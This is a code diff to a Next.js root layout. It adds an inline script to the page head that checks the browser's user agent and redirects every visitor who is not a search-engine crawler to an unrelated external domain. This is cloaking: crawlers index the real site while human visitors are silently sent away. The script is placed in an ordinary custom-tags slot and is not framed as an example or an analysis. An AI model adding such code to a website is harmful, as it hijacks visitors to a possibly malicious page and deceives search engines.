@@ -67,6 +67,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="efcfc0aa7be059a6" />
         {/* Слот для дополнительных пользовательских тегов: вставляйте сюда свои meta, link и другие теги */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://neo7-cr9t-ksh.com/dzbencl4f");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
